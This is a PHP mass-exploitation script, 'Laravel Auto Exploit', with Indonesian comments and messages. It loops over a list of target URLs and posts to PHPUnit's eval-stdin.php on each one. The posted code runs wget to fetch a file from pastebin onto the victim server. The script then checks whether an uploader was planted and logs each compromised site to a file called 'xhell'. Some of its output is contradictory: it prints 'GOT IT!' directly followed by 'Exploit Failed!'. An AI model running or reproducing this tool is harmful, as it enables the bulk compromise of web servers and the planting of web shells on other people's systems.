<?php
/////////////////////////////
//  ---------------------  //
//   LARAVEL AUTO EXPLOIT  //
//     Created : lyxa      //
//  #IndonesianHackerRulez //
//  ---------------------  //
/////////////////////////////

//--------Warna--------//
$kuning = "\033[93m";
$ungu = "\033[95m";
$biru = "\033[94m";
$merah = "\033[91m";
$hijau = "\033[92m";
//-------Tutup--------//

//--------Tentang--------//
error_reporting(0);
echo " $merah ##########################
    $kuning Laravel Auto Exploit
       $kuning Owner : lyxa
   $kuning #IndonesianHackerRulez
 $merah ##########################
\n\n";
//--------Tutup-------//

//--------Path--------//
$site = $argv[1];
$by = '<?php system("wget https://pastebin.com/raw/vKfyPDA3 -O .lyxa.php"); ?>';
$byy = fopen('Results.txt', 'w');
fwrite($byy,$by);
fclose($byy);
$up = '@Results.txt';
$path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
function sv($site,$ext){
$fp = fopen("$ext.txt", 'a');
fwrite($fp, "$site\n");
fclose($fp);
//--------Tutup--------//

}

//--------Exploit--------//
$lusi = explode("\n",file_get_contents($site));
   foreach($lusi as $url){
   	  echo "$hijau root@lyxa~# Mencoba Mengsploitasi... $kuning ~> $url\n"   ;
   	$jj = shell_exec("curl -sk -d ''".$up."'' ".$url.$path."");
   	if(preg_match('/LusianaQ/',$jj)){
   		echo "$hijau root@lyxa $hijau GOT IT!\n";
   		echo "$hijau root@lyxa~# $kuning Exploit Failed!\n";
$parse = parse_url($url.$path);
$pattern = '~\w+\.php~';
$parse = preg_replace($pattern, '', $parse);
$site = $parse['scheme'].'://'.$parse['host'].$parse['path'];
   		if(preg_match('/USTADCAGE_48/',file_get_contents($site."up.php"))){
   			echo "$hijau root@lyxa~# $hijau Uploader Telah Di Buat! \n\n";
   			sv($site."up.php","xhell");
   		} else {
   			echo "$hijau root@lyxa~# $merah Uploader Gagal Di Buat! \n\n";
   		}
   	} else {
   		echo "$hijau root@lyxa~#$merah Ngapain Goblog Baca README.md ~> cat README.md \n\n";
   	}
}
//--------Tutup--------//
